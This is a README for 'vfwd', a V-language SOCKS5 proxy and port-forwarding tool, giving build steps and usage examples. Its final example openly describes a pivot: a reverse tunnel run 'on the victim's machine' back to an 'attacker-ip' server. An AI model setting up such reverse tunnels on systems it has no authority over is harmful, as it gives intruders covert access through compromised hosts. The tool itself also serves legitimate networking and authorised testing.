# vfwd
> Tunneling and port forwarding tool written in Vlang

## Installation

1. Install V from the [website](https://vlang.io/) or the [official github repository](https://github.com/vlang/v).

2. Clone the repository and compile

```bash
$ git clone https://github.com/LvMalware/vfwd
$ cd vfwd
$ v -prod .
```

3. Copy the binary to some directory in your PATH

You can cross-compile it to windows by using `mingw-w64` or download a prebuilt binary from the releases section.

## Usage

```
Usage: vfwd [flags] [commands]

A V tool for tunneling and port fowarding

Flags:
  -h  --help          Prints help information.
  -v  --version       Prints version information.
      --man           Prints the auto-generated manpage.

Commands:
  standalone          Run as a standalone SOCKS5 proxy server
  forward             Run forward mode
  server              Run as a server for remote forward
  help                Prints help information.
  version             Prints version information.
  man                 Prints the auto-generated manpage.

```

`vfwd` supports three modes of operation: `standalone`, `forward` and `server`.

In `standalone` mode, it acts as a regular SOCKS5 proxy server listening on an specified address.

Example:

> act as a SOCKS5 server on port 1080
```bash
$ vfwd standalone -l *:1080
```

In `forward` mode, it can be used to forward traffic from one port/address to another or even traffic from a remote host acting as a SOCKS5 proxy server. Example:

> forward all traffic from port 8443 to duckduckgo on port 443
```bash
$ vfwd forward --from *:8443 --to duckduckgo.com:443
```

In `server` mode, it will serve as a SOCKS5 proxy that forwards the traffic through a remote agent (with reverse connection). Example:

> On the attacker's machine, run:
```bash
$ vfwd server --socks-listen *:1080 --control-listen *:1337
```

> On the victim's machine, run
```bash
$ vfwd forward --from attacker-ip:1337 -r
```
